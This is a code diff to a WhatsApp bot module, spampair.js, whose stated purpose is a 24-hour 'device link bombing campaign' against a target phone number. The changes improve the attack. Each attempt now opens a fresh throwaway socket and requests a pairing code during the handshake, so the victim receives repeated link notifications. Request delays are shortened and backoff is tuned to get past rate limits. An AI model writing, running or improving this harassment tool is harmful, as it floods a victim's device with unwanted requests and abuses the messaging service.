@@ -2,7 +2,10 @@
 // MODULE: spampair.js
 // WhatsApp Bot command: .spampair <phone_number>
 // Starts a 24-hour device link bombing campaign against the target
-// Uses proper useMultiFileAuthState for persistent WA socket identity
+//
+// CRITICAL: requestPairingCode must be called WHILE the socket
+// is still connecting (before QR), NOT after waiting for 'open'.
+// Pattern from pair.js: create socket → setTimeout → requestPairingCode
 // ============================================================
 
 const express = require('express');
@@ -13,9 +16,9 @@ const EventEmitter = require('events');
 
 // ---------- CONFIGURATION ----------
 const DEFAULT_DURATION_HOURS = 24;
-const REQUEST_DELAY_MIN_MS = 12000;
-const REQUEST_DELAY_MAX_MS = 18000;
-const SESSIONS_DIR = path.join(__dirname, '..', '..', 'spampair_sessions');
+const REQUEST_DELAY_MIN_MS = 10000;
+const REQUEST_DELAY_MAX_MS = 15000;
+const SOCKET_TIMEOUT_MS = 15000;
 
 // ---------- STATE ----------
 const activeCampaigns = new Map();
@@ -30,16 +33,11 @@ class SpamPair extends EventEmitter {
     this.sessionId = crypto.randomBytes(8).toString('hex');
     this._runLoop = this._runLoop.bind(this);
     this._baileys = null;
-    this._sock = null;
-    this._saveCreds = null;
-    this._connUpdateHandler = null;
-    this._connPromise = null;
+    this._browser = null;
   }
 
   _formatNumber(num) {
-    let clean = String(num || '').replace(/\D/g, '');
-    if (!clean.startsWith('91')) clean = '91' + clean;
-    return clean;
+    return String(num || '').replace(/\D/g, '');
   }
 
   _randomDelay() {
@@ -53,150 +51,151 @@ class SpamPair extends EventEmitter {
   _ensureBaileys() {
     if (!this._baileys) {
       try {
-        const baileys = require("@whiskeysockets/baileys");
-        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState } = baileys;
-        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState };
+        const { createRequire } = require('module');
+        const baileysPkg = path.join(__dirname, '..', '..', 'whatsapp-bot', 'node_modules', '@whiskeysockets', 'baileys', 'package.json');
+        const baileysRequire = createRequire(baileysPkg);
+        const baileys = baileysRequire("@whiskeysockets/baileys");
+        const {
+          default: makeWASocket,
+          DisconnectReason,
+          fetchLatestBaileysVersion,
+          Browsers,
+          useMultiFileAuthState
+        } = baileys;
+        this._baileys = { makeWASocket, DisconnectReason, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState };
         this._browser = Browsers?.ubuntu('Chrome');
       } catch (_be) {
-        throw new Error('Baileys library not available in this environment');
+        throw new Error('Baileys library not available: ' + (_be.message || ''));
       }
     }
     return this._baileys;
   }
 
-  // ---------- PERSISTENT SOCKET with useMultiFileAuthState ----------
-  async _ensureSocket() {
-    if (this._sock && this._sock.ws?.readyState === 1) return true;
-    if (this._connPromise) return this._connPromise;
+  // ---------- ONE ATTEMPT — fresh socket per attempt ----------
+  async _attemptLink() {
+    const {
+      makeWASocket,
+      useMultiFileAuthState,
+      fetchLatestBaileysVersion,
+      Browsers
+    } = this._ensureBaileys();
 
-    this._connPromise = this._connectSocket();
-    try {
-      return await this._connPromise;
-    } finally {
-      this._connPromise = null;
-    }
-  }
+    // Use a temp session dir so each attempt starts with fresh creds.
+    // After each attempt we delete it — no persistent identity needed.
+    const attemptId = crypto.randomBytes(4).toString('hex');
+    const sessionDir = path.join(__dirname, '..', '..', 'spampair_sessions', attemptId);
+    fs.mkdirSync(sessionDir, { recursive: true });
 
-  async _connectSocket() {
-    const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
+    let sock = null;
+    let connTimeout = null;
+    let pairingTimeout = null;
+    let cleanupDone = false;
 
-    // Create session directory for this campaign's persistent auth
-    const sessionDir = path.join(SESSIONS_DIR, this.phone);
-    if (!fs.existsSync(sessionDir)) {
-      fs.mkdirSync(sessionDir, { recursive: true });
-    }
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    this._saveCreds = saveCreds;
-
-    const { version } = await fetchLatestBaileysVersion();
-
-    let connResolve, connReject;
-    const connPromise = new Promise((res, rej) => { connResolve = res; connReject = rej; });
-    const timeout = setTimeout(() => connReject(new Error('Socket connect timeout (25s)')), 25000);
-
-    this._connUpdateHandler = (update) => {
-      if (update.connection === 'open') {
-        clearTimeout(timeout);
-        connResolve(true);
+    const cleanup = () => {
+      if (cleanupDone) return;
+      cleanupDone = true;
+      if (connTimeout) clearTimeout(connTimeout);
+      if (pairingTimeout) clearTimeout(pairingTimeout);
+      if (sock) {
+        try { sock.end(new Error('SpamPair: done')); } catch (_) {}
+        sock = null;
       }
-      if (update.lastDisconnect?.error) {
-        clearTimeout(timeout);
-        connReject(update.lastDisconnect.error);
-      }
+      // Clean up session files
+      try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
     };
 
-    this._sock = makeWASocket({
-      version,
-      browser: this._browser || Browsers.ubuntu('Chrome'),
-      auth: {
-        creds: state.creds,
-        keys: state.keys
-      },
-      generateHighQualityLinkPreview: false,
-      shouldSyncHistoryMessage: () => false,
-      getMessage: async () => undefined,
-      connectTimeoutMs: 20000,
-      defaultQueryTimeoutMs: 20000,
-      logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
+    return new Promise((resolve) => {
+      (async () => {
+        try {
+          const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+          const { version } = await fetchLatestBaileysVersion();
+
+          // Socket-level killswitch
+          const abortController = new AbortController();
+
+          sock = makeWASocket({
+            version,
+            browser: this._browser || Browsers.ubuntu('Chrome'),
+            auth: {
+              creds: state.creds,
+              keys: state.keys
+            },
+            generateHighQualityLinkPreview: false,
+            shouldSyncHistoryMessage: () => false,
+            getMessage: async () => undefined,
+            connectTimeoutMs: 10000,
+            defaultQueryTimeoutMs: 10000,
+            // Quiet logger — don't pollute backend logs
+            logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
+          });
+
+          sock.ev.on('creds.update', saveCreds);
+
+          // 1) CONNECTION TIMEOUT — if socket doesn't connect fast enough, fail
+          connTimeout = setTimeout(() => {
+            if (!cleanupDone) {
+              cleanup();
+              resolve(false);
+            }
+          }, SOCKET_TIMEOUT_MS);
+
+          // 2) KEY MOMENT: call requestPairingCode AFTER socket creation,
+          //    BEFORE it fully opens (during the connecting/handshake phase).
+          //    This is the exact pattern from pair.js setTimeout.
+          pairingTimeout = setTimeout(async () => {
+            try {
+              const code = await sock.requestPairingCode(this.phone);
+
+              // If we got a code, the server sent a notification to the target!
+              this.stats.attempts++;
+              this.stats.success++;
+              cleanup();
+              resolve(true);
+            } catch (pairErr) {
+              // Pairing failed — clean up and return false
+              this.stats.attempts++;
+              this.stats.errors++;
+              cleanup();
+              resolve(false);
+            }
+          }, 500); // Small delay to let socket start handshaking
+
+          // 3) Listen for connection errors — if socket dies, fail cleanly
+          const connEvtHandler = (update) => {
+            if (update.lastDisconnect?.error && !cleanupDone) {
+              // Socket disconnected before we got the pairing code
+              if (pairingTimeout) clearTimeout(pairingTimeout);
+              this.stats.attempts++;
+              this.stats.errors++;
+              cleanup();
+              resolve(false);
+            }
+            // If socket opens successfully before we get the code, the
+            // pairing would have already been sent (the timeout fires at 500ms).
+            // We can close the socket and count as success if code was received.
+            if (update.connection === 'open' && !cleanupDone) {
+              // Socket opened — requestPairingCode already fired at 500ms.
+              // Wait 1s for the code response, then clean up.
+              setTimeout(() => {
+                if (!cleanupDone) {
+                  // requestPairingCode didn't return — fail
+                  cleanup();
+                  resolve(false);
+                }
+              }, 3000);
+            }
+          };
+          sock.ev.on('connection.update', connEvtHandler);
+
+        } catch (err) {
+          // Setup failed (auth state, version fetch, etc.)
+          this.stats.attempts++;
+          this.stats.errors++;
+          cleanup();
+          resolve(false);
+        }
+      })();
     });
-
-    this._sock.ev.on('connection.update', this._connUpdateHandler);
-
-    // Also save creds when they update (handles key refreshes from server)
-    this._sock.ev.on('creds.update', saveCreds);
-
-    await connPromise;
-
-    // Extra buffer for server stanzas to arrive
-    await this._sleep(3000);
-    return true;
-  }
-
-  _cleanupSocket() {
-    if (this._sock) {
-      if (this._connUpdateHandler) {
-        try { this._sock.ev?.off('connection.update', this._connUpdateHandler); } catch (_) {}
-      }
-      try { this._sock.ev?.off('creds.update', this._saveCreds); } catch (_) {}
-      try { this._sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
-      this._sock = null;
-      this._saveCreds = null;
-      this._connUpdateHandler = null;
-    }
-    this._connPromise = null;
-  }
-
-  // ---------- CORE ATTEMPT — reuses persistent socket ----------
-  async _attemptLink() {
-    let errMsg = '';
-    try {
-      await this._ensureSocket();
-      if (!this._sock || this._sock.ws?.readyState !== 1) {
-        throw new Error('Socket not connected');
-      }
-
-      const code = await Promise.race([
-        this._sock.requestPairingCode(this.phone),
-        new Promise((_, rej) => setTimeout(() => rej(new Error('requestPairingCode timeout (20s)')), 20000))
-      ]);
-
-      this.stats.attempts++;
-      this.stats.success++;
-      return true;
-
-    } catch (error) {
-      this.stats.attempts++;
-      this.stats.errors++;
-      errMsg = String(error?.message || error || 'Unknown').slice(0, 200);
-
-      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
-        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
-        await this._sleep(60000);
-      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake') || errMsg.includes('disconnect') || errMsg.includes('timeout')) {
-        this._cleanupSocket();
-        await this._sleep(20000);
-      } else {
-        // For other errors (like "already registered", "device not supported", etc),
-        // close socket so _ensureSocket reconnects fresh next time
-        this._cleanupSocket();
-        await this._sleep(10000);
-      }
-
-      // Send a progress message every 5 errors so user knows campaign is running
-      if (this.stats.errors % 5 === 1 && this.stats.errors <= 6) {
-        this.emit('progress', {
-          phone: this.phone,
-          attempts: this.stats.attempts,
-          success: this.stats.success,
-          errors: this.stats.errors,
-          elapsed: Math.round((Date.now() - (this._startTime || Date.now())) / 1000),
-          note: `Last error: ${errMsg}`
-        });
-      }
-
-      return false;
-    }
   }
 
   // ---------- MAIN LOOP ----------
@@ -205,14 +204,11 @@ class SpamPair extends EventEmitter {
     this._startTime = startTime;
     this.emit('start', { phone: this.phone, duration: this.durationMs });
 
-    // Pre-clean any stale session before starting
-    this._cleanupSocket();
-
     while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
       const ok = await this._attemptLink();
 
-      // Progress every 10 attempts or on first error
-      if (this.stats.attempts % 10 === 0 || (this.stats.attempts === 1 && !ok)) {
+      // Progress
+      if (this.stats.attempts % 10 === 0 || (this.stats.attempts === 1)) {
         this.emit('progress', {
           phone: this.phone,
           attempts: this.stats.attempts,
@@ -222,14 +218,20 @@ class SpamPair extends EventEmitter {
         });
       }
 
-      await this._sleep(this._randomDelay());
+      // Rate-limit detection
+      if (!ok && this.stats.errors > this.stats.success + 3) {
+        // Lots of failures — slow down
+        await this._sleep(this._randomDelay() + 3000);
+      } else {
+        await this._sleep(this._randomDelay());
+      }
 
+      // Rotate session id every 50 attempts
       if (this.stats.attempts % 50 === 0) {
         this.sessionId = crypto.randomBytes(8).toString('hex');
       }
     }
 
-    this._cleanupSocket();
     this.emit('done', {
       phone: this.phone,
       totalAttempts: this.stats.attempts,
@@ -251,7 +253,6 @@ class SpamPair extends EventEmitter {
 
   stop() {
     this.stopFlag = true;
-    this._cleanupSocket();
     this.emit('stopped', { phone: this.phone, stats: this.stats });
     return this;
   }
@@ -262,7 +263,7 @@ class SpamPair extends EventEmitter {
 }
 
 // ================================================================
-// EXPRESS API ROUTES
+// EXPRESS ROUTES
 // ================================================================
 
 const router = express.Router();
